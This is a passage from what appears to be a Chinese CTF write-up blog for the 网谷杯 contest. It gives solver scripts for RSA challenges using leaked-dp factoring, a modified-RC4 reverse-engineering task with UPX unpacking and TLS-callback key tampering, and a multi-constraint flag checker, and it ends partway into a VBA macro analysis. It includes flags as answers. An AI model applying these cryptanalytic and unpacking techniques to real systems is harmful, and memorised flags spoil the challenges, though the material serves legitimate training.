class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes # 导入用于处理大整数和字节串的库</span><br><span class="line">import math # 导入数学库，用于最大公约数计算</span><br><span class="line"></span><br><span class="line"># 这段脚本旨在解决三个基于 RSA 的密码学挑战（CTF 题目）</span><br><span class="line"></span><br><span class="line"># --- Flag1: 题面已给 d1, n1，直接解密 ---</span><br><span class="line"># d1 是第一个挑战的私钥指数</span><br><span class="line">d1 = int(</span><br><span class="line">    &quot;246014400079542834092587904158893656266047385977563055118072356568676746697095&quot;</span><br><span class="line">    &quot;825913864806962708152448954200878667383422993297898494259484707349502246104506&quot;</span><br><span class="line">    &quot;292708966897357241647506535040670750128510698600522884133934921403976388746897&quot;</span><br><span class="line">    &quot;47304249627737638521072321625292497180208183282090634794285367566044496049&quot;</span><br><span class="line">)</span><br><span class="line"># n1 是第一个挑战的模数</span><br><span class="line">n1 = int(</span><br><span class="line">    &quot;121216793759965406495195349784688471172903898464863919579528667261419201175006&quot;</span><br><span class="line">    &quot;158506254851920269184174476441342645096664857617956346276850231302641370595849&quot;</span><br><span class="line">    &quot;992364168925183323567715165305825214477546120105756089950903529561478112787635&quot;</span><br><span class="line">    &quot;175307546002017263761103481685637785188859785795387227441771118141108993731&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># --- Flag2: dp 泄露攻击 ---</span><br><span class="line"># n2 是第二个挑战的模数</span><br><span class="line">n2 = int(</span><br><span class="line">    &quot;880240914857229681312031297728305248816545296251441345888143405900115541246043&quot;</span><br><span class="line">    &quot;164032587947185950587601925814651819329544052882761982559510378904410578348151&quot;</span><br><span class="line">    &quot;153512391510277303040801105941161928077798175274696915482616445385505290118824&quot;</span><br><span class="line">    &quot;99685981945213841298369305720161373509056672240371216670722254664850792423&quot;</span><br><span class="line">)</span><br><span class="line"># dp2_hex 是私钥指数 d 模 p-1 的结果，以十六进制给出</span><br><span class="line">dp2_hex = (</span><br><span class="line">    &quot;008a1bb5ddfff1643cb542d174a0f4e0616503e28778bd2ecd965026baba357303627d6044b77&quot;</span><br><span class="line">    &quot;34cef07b8a1176d886ca987cd21ca091755eef7f20634a921ce81&quot;</span><br><span class="line">)</span><br><span class="line">e2 = 65537 # 公钥指数</span><br><span class="line"></span><br><span class="line"># --- Flag3: dp 泄露攻击 ---</span><br><span class="line"># n3 是第三个挑战的模数</span><br><span class="line">n3 = int(</span><br><span class="line">    &quot;161097000312435047639025857083798608426453770394810689419872061300529854423940&quot;</span><br><span class="line">    &quot;452844900091705515387130272189159935215821125906831946941166430461267964034092&quot;</span><br><span class="line">    &quot;194438035823677086083564924149614045494613496178826123777949284989729443312266&quot;</span><br><span class="line">    &quot;399276493423985154752448654420778684877265358368899693320567387749119123981&quot;</span><br><span class="line">)</span><br><span class="line"># dp3_hex 是私钥指数 d 模 p-1 的结果，以十六进制给出</span><br><span class="line">dp3_hex = (</span><br><span class="line">    &quot;0087462d8061c0f6251ca4e9b9dd7d5926d96081d5b52f7b76581365865278f0a13f7051d2ece1&quot;</span><br><span class="line">    &quot;dda234c41946211a4839f72b2b5fb82bbfa286d82e868ce87341&quot;</span><br><span class="line">)</span><br><span class="line">e3 = 65537 # 公钥指数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_cipher(path: str) -&gt; int:</span><br><span class="line">    &quot;&quot;&quot;从文件中读取密文，并将其转换为大整数。&quot;&quot;&quot;</span><br><span class="line">    with open(path, &quot;rb&quot;) as f:</span><br><span class="line">        return bytes_to_long(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rsa_decrypt_with_d(n: int, d: int, c: int) -&gt; bytes:</span><br><span class="line">    &quot;&quot;&quot;使用完整的私钥指数 d 对密文进行解密。</span><br><span class="line">    </span><br><span class="line">    参数:</span><br><span class="line">        n (int): RSA 模数。</span><br><span class="line">        d (int): 私钥指数。</span><br><span class="line">        c (int): 密文大整数。</span><br><span class="line">    </span><br><span class="line">    返回:</span><br><span class="line">        bytes: 解密后的明文字节串。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    m = pow(c, d, n) # RSA 解密的核心操作: m = c^d mod n</span><br><span class="line">    pt = long_to_bytes(m) # 将大整数明文转换回字节串</span><br><span class="line">    return pt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recover_p_from_dp(n: int, e: int, dp: int) -&gt; int | None:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据 d_p（dp）和 n、e，利用 Fermat 小定理或 k 枚举来恢复素数 p。</span><br><span class="line">    原理是 dp = d mod (p-1) = e^-1 mod (p-1)。</span><br><span class="line">    这推导出 e*dp ≡ 1 (mod p-1)，所以 e*dp - 1 是 p-1 的倍数。</span><br><span class="line">    即 e*dp - 1 = k*(p-1)，可以重新排列得到 p = (e*dp-1)/k + 1。</span><br><span class="line">    </span><br><span class="line">    为了找到 k，我们利用一个已知的引理：</span><br><span class="line">    (e*dp - 1) = k*(p-1) 且 a^(e*dp-1) ≡ a^k(p-1) ≡ a (mod p)</span><br><span class="line">    所以 gcd(a^(e*dp-1) - a, n) 会得到 p 或 q 的因子。</span><br><span class="line">    </span><br><span class="line">    参数:</span><br><span class="line">        n (int): RSA 模数。</span><br><span class="line">        e (int): 公钥指数。</span><br><span class="line">        dp (int): 泄露的私钥指数 dp。</span><br><span class="line">    </span><br><span class="line">    返回:</span><br><span class="line">        int | None: 如果成功找到 p，返回 p；否则返回 None。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 优先使用更稳妥的 GCD 方法来分解 n</span><br><span class="line">    edp = e * dp - 1</span><br><span class="line">    for a in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31):</span><br><span class="line">        g = math.gcd(pow(a, edp, n) - 1, n)</span><br><span class="line">        if 1 &lt; g &lt; n:</span><br><span class="line">            return g</span><br><span class="line"></span><br><span class="line">    # 如果 GCD 方法失败，回退到 k 枚举法</span><br><span class="line">    num = edp # edp - 1</span><br><span class="line">    for k in range(1, e):</span><br><span class="line">        if num % k == 0:</span><br><span class="line">            p = num // k + 1</span><br><span class="line">            if p &gt; 1 and n % p == 0:</span><br><span class="line">                return p</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rsa_decrypt_with_dp(n: int, e: int, dp_hex: str, c: int) -&gt; bytes:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用泄露的 dp 来解密 RSA 密文。</span><br><span class="line">    该函数首先利用 dp 恢复出 p，然后计算 q、phi、d，最后完成解密。</span><br><span class="line">    </span><br><span class="line">    参数:</span><br><span class="line">        n (int): 模数。</span><br><span class="line">        e (int): 公钥指数。</span><br><span class="line">        dp_hex (str): 泄露的 dp，十六进制格式。</span><br><span class="line">        c (int): 密文。</span><br><span class="line">    </span><br><span class="line">    返回:</span><br><span class="line">        bytes: 解密后的明文。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 将十六进制字符串 dp_hex 转换为大整数 dp</span><br><span class="line">    dp = int(dp_hex, 16)</span><br><span class="line">    </span><br><span class="line">    # 恢复素数 p</span><br><span class="line">    p = recover_p_from_dp(n, e, dp)</span><br><span class="line">    if not p:</span><br><span class="line">        raise ValueError(&quot;未能从 dp 恢复出 p。&quot;)</span><br><span class="line">    </span><br><span class="line">    # 根据 p 和 n 计算 q，并计算 phi(n)</span><br><span class="line">    q = n // p</span><br><span class="line">    phi = (p - 1) * (q - 1)</span><br><span class="line">    </span><br><span class="line">    # 计算完整的私钥指数 d = e^-1 mod phi</span><br><span class="line">    d = pow(e, -1, phi)</span><br><span class="line">    </span><br><span class="line">    # 使用 d 对密文进行解密</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    </span><br><span class="line">    # 将解密结果转换回字节串</span><br><span class="line">    return long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def try_print(tag: str, data: bytes):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    尝试以 UTF-8 编码打印数据，如果失败则以十六进制形式打印。</span><br><span class="line">    </span><br><span class="line">    参数:</span><br><span class="line">        tag (str): 打印时使用的前缀标签。</span><br><span class="line">        data (bytes): 待打印的字节串数据。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        # 尝试解码为 UTF-8，忽略无法解码的字符</span><br><span class="line">        print(f&quot;&#123;tag&#125;: &#123;data.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;, end=&quot;&quot;)</span><br><span class="line">    except Exception:</span><br><span class="line">        # 如果解码失败，打印十六进制表示</span><br><span class="line">        print(f&quot;&#123;tag&#125; (hex): &#123;data.hex()&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &quot;&quot;&quot;主函数，依次执行三个挑战的解密任务。&quot;&quot;&quot;</span><br><span class="line">    # Flag1: 直接使用给定的 n1, d1 解密</span><br><span class="line">    c1 = read_cipher(&quot;flag1.txt&quot;)</span><br><span class="line">    pt1 = rsa_decrypt_with_d(n1, d1, c1)</span><br><span class="line">    try_print(&quot;Flag1&quot;, pt1)</span><br><span class="line"></span><br><span class="line">    # Flag2: 使用泄露的 dp2 解密</span><br><span class="line">    c2 = read_cipher(&quot;flag2.txt&quot;)</span><br><span class="line">    pt2 = rsa_decrypt_with_dp(n2, e2, dp2_hex, c2)</span><br><span class="line">    try_print(&quot;\nFlag2&quot;, pt2)</span><br><span class="line"></span><br><span class="line">    # Flag3: 使用泄露的 dp3 解密</span><br><span class="line">    c3 = read_cipher(&quot;flag3.txt&quot;)</span><br><span class="line">    pt3 = rsa_decrypt_with_dp(n3, e3, dp3_hex, c3)</span><br><span class="line">    try_print(&quot;\nFlag3&quot;, pt3)</span><br><span class="line">    print() # 换行</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>flag{You_do_have_a_good_understanding_of_certificate_formats_and_the_RSA_algorithm.}</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913191635021.png"  alt="image-20250913191635021"></p>
<h2 id="三重秘影-wgb"><a href="#三重秘影-wgb" class="headerlink" title="三重秘影-wgb"></a><strong>三重秘影-wgb</strong></h2><p>一共有三个加密</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913192348390.png"  alt="image-20250913192348390"></p>
<p><img   src="C:/Users/Administrator/Desktop/111/7dc6d67ae0448e9163f21f9593e5b447.jpg"  alt="7dc6d67ae0448e9163f21f9593e5b447"></p>
<p>这里还有一个图片，把它也提取出来</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913192941109.png"  alt="image-20250913192941109"></p>
<p>解密得到9273016854</p>
<p>最后还有一个base64<img   src="C:/Users/Administrator/Desktop/111/image-20250913193346108.png"  alt="image-20250913193346108"></p>
<p>最后SM4解密</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913193521672.png"  alt="image-20250913193521672"></p>
<p>flag{a8d2f9b1c3e7g6h4i5j}</p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="re1-NewRC4-wgb"><a href="#re1-NewRC4-wgb" class="headerlink" title="re1-NewRC4-wgb"></a>re1-NewRC4-wgb</h2><p>先查壳，看到UPX，这个是魔改了</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps1.jpg"  alt="img"> </p>
<p>用010打开，把VMP都改成UPX就好了</p>
<p>用upx 命令脱壳，然后放到IDA里面进行逆向分析</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps2.jpg"  alt="img"> </p>
<p>这个密文是错的，它使用了TLS回调，会修改key的值，如果动态调试也会被检测出来，key还会被修改</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps3.jpg"  alt="img"> </p>
<p>那么真正的key就是 那一串nbGvzyHebFGcV8auYoqe 与 0x7a异或</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps4.jpg"  alt="img"> </p>
<p>这个很明显是rc4魔改了</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps5.jpg"  alt="img"> </p>
<p>都在后面加上了113</p>
<p>直接写出脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    key = [0x14,0x18,0x3d,0x0c,0x00,0x03,0x32,0x1f,0x18,0x3c,0x3d,0x19,0x2c,0x42,0x1b,0x0f,0x23,0x15,0x0b,0x1f]</span><br><span class="line">    key_len = len(key)</span><br><span class="line"></span><br><span class="line">    # 模拟RC4的KSA (密钥调度算法)</span><br><span class="line">    S = list(range(256))</span><br><span class="line">    T = [key[i % key_len] for i in range(256)]</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + S[i] + T[i]) % 256</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    S_ksa_final = S[:]</span><br><span class="line">    buf1_dwords = [</span><br><span class="line">        -1099083345, 2129584582, 1339278712, -1197737055,</span><br><span class="line">        632459247, -1426643507, -314991759, -1937737471,</span><br><span class="line">        -1369194212, -269001761</span><br><span class="line">    ]</span><br><span class="line">    buf1_word = 10008</span><br><span class="line"></span><br><span class="line">    ciphertext = b&#x27;&#x27;</span><br><span class="line">    for d in buf1_dwords:</span><br><span class="line">        ciphertext += struct.pack(&#x27;&lt;i&#x27;, d)</span><br><span class="line">    ciphertext += struct.pack(&#x27;&lt;h&#x27;, buf1_word)</span><br><span class="line">    </span><br><span class="line">    ciphertext = ciphertext[:42]</span><br><span class="line"></span><br><span class="line">    #模拟变种RC4的PRGA并解密</span><br><span class="line">    plaintext = bytearray()</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    for char_idx in range(len(ciphertext)):</span><br><span class="line">  </span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + S_ksa_final[i]) % 256</span><br><span class="line">        </span><br><span class="line">        s_i_before_swap = S_ksa_final[i]</span><br><span class="line">        </span><br><span class="line">        S_ksa_final[i], S_ksa_final[j] = S_ksa_final[j], S_ksa_final[i]</span><br><span class="line">        </span><br><span class="line">        s_i_after_swap = S_ksa_final[i]</span><br><span class="line">        </span><br><span class="line">        t = (s_i_before_swap + s_i_after_swap) % 256</span><br><span class="line">        keystream_byte = S_ksa_final[t]</span><br><span class="line"></span><br><span class="line">        # 解密公式</span><br><span class="line">        dec_byte = ((ciphertext[char_idx] - 113) &amp; 0xFF) ^ keystream_byte</span><br><span class="line">        plaintext.append(dec_byte)</span><br><span class="line"></span><br><span class="line">    return plaintext.decode()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        flag = solve()</span><br><span class="line">        print(f&quot;The flag is: &#123;flag&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot; An error occurred: &#123;e&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913202417433.png"  alt="image-20250913202417433"></p>
<h2 id="算法组合-wgb"><a href="#算法组合-wgb" class="headerlink" title="算法组合-wgb"></a><strong>算法组合-wgb</strong></h2><p>使用IDA进行逆向分析</p>
<p>这个是有多个算法来限制flag的，flag的长度是20，并且要求flag{}包裹</p>
<p>直接喂给ai</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps6.jpg"  alt="img"> </p>
<p>1.把输入按6段切开并依次参与后续校验：</p>
<p>[0..4]”f1ag{“|[5..8]4字节|[9..12]4字节|[13]1字节|[14..18]5字节|[19]</p>
<p>2.AES-like”块校验</p>
<p>用byte_BB400 AES S-box和dword_F6380(FIPS-197经典示例密钥2B 7E 15 16</p>
<p>…的派生表）对前16字节做5轮样式的变换，结果要匹配常量xmmword_BB500。</p>
<p>结合后续约束，这一块把前16字节唯一卡成了：</p>
<p>b”flag[r3v3rs3_1s_”(（也就是内容第0.15位）。</p>
<ol start="3">
<li>单字符凯撒+3，要求变换后的字符串等于“4”，且原字符得是数字→下标13必为1”。</li>
<li>5字节自定义64表映射+明文直比。结果必须是“”zfm1u”；</li>
</ol>
<p>接着程序又直接把原字节和”s_fun”做逐字比较→下标14.18为”s_fun”。</p>
<ol start="5">
<li>4字节异或常量</li>
</ol>
<p>另一段4字节（对应分段向量的第5&#x2F;6项，落在下标9.12）每字节0x42后要等于常量</p>
<p>493957424的“小端”字节串，即b’01q\x1d’。</p>
<p>6.统计约束</p>
<p>末尾还有一条：数字个数&gt;1且元音（aeiou）总数&gt;1。</p>
<p>r3v3rs3_1s_fun里有数字3”和”1’两个；元音a’，’u两个，满足。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">def rotp3(ch: str) -&gt; str:</span><br><span class="line">    &quot;&quot;&quot;凯撒 +3 加密&quot;&quot;&quot;</span><br><span class="line">    o = ord(ch)</span><br><span class="line">    if 97 &lt;= o &lt;= 122:  # a-z</span><br><span class="line">        return chr((o - 97 + 3) % 26 + 97)</span><br><span class="line">    if 65 &lt;= o &lt;= 90:  # A-Z</span><br><span class="line">        return chr((o - 65 + 3) % 26 + 65)</span><br><span class="line">    if 48 &lt;= o &lt;= 57:  # 0-9</span><br><span class="line">        return chr((o - 48 + 3) % 10 + 48)</span><br><span class="line">    return ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def inv_rotp3_to_make_4() -&gt; str:</span><br><span class="line">    &quot;&quot;&quot;第13位字符：逆运算得到 rotp3(seg3) == &#x27;4&#x27; 的原字符&quot;&quot;&quot;</span><br><span class="line">    o = ord(&#x27;4&#x27;) - 48</span><br><span class="line">    return chr((o - 3) % 10 + 48)  # 结果为 &#x27;1&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recover_seg2_from_xor() -&gt; str:</span><br><span class="line">    &quot;&quot;&quot;下标9..12的4字节：每字节 ^0x42 后得到 b&#x27;01q\x1d&#x27;，反推原字节&quot;&quot;&quot;</span><br><span class="line">    target = 493_957_424  # 0x1D713130</span><br><span class="line">    le = target.to_bytes(4, &#x27;little&#x27;)  # b&#x27;\x30\x31\x71\x1d&#x27;</span><br><span class="line">    raw = bytes([b ^ 0x42 for b in le])</span><br><span class="line">    return raw.decode(&#x27;latin1&#x27;)  # 返回 &#x27;rs3_&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(s: str) -&gt; bool:</span><br><span class="line">    &quot;&quot;&quot;校验 flag 是否满足约束&quot;&quot;&quot;</span><br><span class="line">    if len(s) != 20 or not s.startswith(&quot;flag&#123;&quot;) or s[-1] != &quot;&#125;&quot;:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    seg1 = s[5:9]</span><br><span class="line">    seg2 = s[9:13]</span><br><span class="line">    seg3 = s[13:14]</span><br><span class="line">    seg4 = s[14:19]</span><br><span class="line"></span><br><span class="line">    # 前16字节约束</span><br><span class="line">    if s[:16] != &quot;flag&#123;r3v3rs3_1s_&quot;:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # 单字符 rotp3 后应为 &#x27;4&#x27;</span><br><span class="line">    if not seg3.isdigit() or rotp3(seg3) != &quot;4&quot;:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # 段4必须为 &#x27;s_fun&#x27;</span><br><span class="line">    if seg4 != &quot;s_fun&quot;:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # 段2每字节 ^0x42 == b&#x27;01q\x1d&#x27;</span><br><span class="line">    want = bytes([0x30, 0x31, 0x71, 0x1d])</span><br><span class="line">    got = bytes([ord(c) ^ 0x42 for c in seg2])</span><br><span class="line">    if got != want:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # 数字&gt;1 且元音&gt;1</span><br><span class="line">    digits = sum(ch.isdigit() for ch in s)</span><br><span class="line">    vowels = sum(ch in &quot;aeiou&quot; for ch in s)</span><br><span class="line">    if not (digits &gt; 1 and vowels &gt; 1):</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    head, tail = &quot;flag&#123;&quot;, &quot;&#125;&quot;</span><br><span class="line">    seg1 = &quot;r3v3&quot;</span><br><span class="line">    seg2 = recover_seg2_from_xor()  # &#x27;rs3_&#x27;</span><br><span class="line">    seg3 = inv_rotp3_to_make_4()    # &#x27;1&#x27;</span><br><span class="line">    seg4 = &quot;s_fun&quot;</span><br><span class="line"></span><br><span class="line">    flag = f&quot;&#123;head&#125;&#123;seg1&#125;&#123;seg2&#125;&#123;seg3&#125;&#123;seg4&#125;&#123;tail&#125;&quot;</span><br><span class="line"></span><br><span class="line">    # 自检</span><br><span class="line">    assert len(flag) == 20</span><br><span class="line">    assert flag.startswith(&quot;flag&#123;&quot;) and flag.endswith(&quot;&#125;&quot;)</span><br><span class="line">    assert seg2 == &quot;rs3_&quot;</span><br><span class="line">    assert seg3 == &quot;1&quot;</span><br><span class="line">    assert seg4 == &quot;s_fun&quot;</span><br><span class="line">    assert sum(ch.isdigit() for ch in flag) &gt; 1</span><br><span class="line">    assert sum(ch in &quot;aeiou&quot; for ch in flag) &gt; 1</span><br><span class="line"></span><br><span class="line">    print(&quot;flag:&quot;, flag)</span><br><span class="line">    print(&quot;check:&quot;, &quot;ok&quot; if check(flag) else &quot;FAIL&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913202645582.png"  alt="image-20250913202645582"></p>
<p> flag{r3v3rs3_1s_fun}</p>
<h2 id="满江红-wgb"><a href="#满江红-wgb" class="headerlink" title="满江红-wgb"></a><strong>满江红-wgb</strong></h2><p>考的是VBA宏</p>
<p>使用命令olevba E:\re\网谷杯\满江红.doc</p>
<p><img   src="C:/Users/Administrator/Desktop/111/wps7.jpg"  alt="img"> </p>
<p> 这是多个base64加密，解密逻辑是使用了一个大的 Base64 编码的密钥 key，结合数组 ciphertext 进行 XOR 解密，然后拼接成字符串。</p>
<p>import base64<br>​<br># Base64 解码 key<br>def base64decode(s):<br>  return base64.b64decode(s)<br>​<br># unxor 函数<br>def unxor(ciphertext, start, key):<br>  cleartext &#x3D; “”<br>  for i in range(len(ciphertext)):<br>    cleartext +&#x3D; chr(key[i + start] ^ ciphertext[i])<br>  return cleartext<br>​<br># Base64 key（VBA 中的拼接内容）<br>key_b64 &#x3D; (<br>  “rFd10H3vao2RCodxQF2lbfkUAjIr&#x2F;6DL5qCnyC4p5EA0tEOXFafhhIdAIhum0XulB9+lU9wKRrDSWZ7XHGxFnPVUhqNK2DCnW8bI1MVWYxGhC4q5iFT5EzfCdTcWUu2+X9VTnKuwcOaIxVcmVyVjrWIRz4Dm3kecLNgAU8fZOKcu&#x2F;XuMXN85ZMKjd3Rv882RBUFmICvacdJ36Yojk5HAwYoBpjjjHydt4NwJisnXgtA3K+2xqGEBfAPmz73uyn7CxCKGt7xPUdc+oRoeY+oObiyzIEPQS3mhWffHsNBhkbrBz1os3xEgxuM3gN6Xa5SE7Zo6G7vMFeKdYops3DGQuyDY60v7KXscOCLxwqeRFC+buIRH69E90JdP7KSC4CDZhxlv&#x2F;cnX6HWdcWh7UTM7CWqzymtkqm&#x2F;3fjp76pGxscG40k&#x2F;M6UjaMnWg++oCkJZFMMenTvaxZ7GwyedlMxbOAtZ+INlBK+tPPIFbG42SRtmJH1e8Uz5p1E7h61vdxBkl”<br>  “l3sd196txhtnIlFZyHBc5IKXxHCbTa5hLl3CBpEgbn1I2FFhaEsYCtVyQrkdPmA5X6CuFhjuRacVoM131pMLVE7IQDG717EZ5BdiLOc4pb+5Q1iMAXfQQ6soJrjxM8ZgjzQYO5WuQkQFdfko6QZEa&#x2F;0QaqhysOozj&#x2F;sTeoj2wI2A0C&#x2F;bwV35cV5EXJNOawqbWJCXdwzdsD8QjNhiDYGYFicJIRD5MBshvm1RGv1CZz54n+ziSgGe2vJ6GMy4cWv+i+hy0&#x2F;shNgvhVcKuJfuPZuFUUHtqD3w07yZKj2ma+iKYCvIRO9nu8lYOQpbbowha1OyfGzx7BJkvJxth3b1xoJaiNMRwQZz&#x2F;fiC8zvYxTlB0bsIHKR07xgI8gfCDd+NIhwL3YbdAor7ZfHhH3jNhBTykOlyrc&#x2F;0yLQSTR8dx0BC9QMIerbSCqZ1Q4rUGEPiXIVvXjtrEhnSBTZW4U5uJHfGQbzlVuuRRCUAjyIzGCDHbDCjvEgwbNLLEzqdeJrh9”<br>  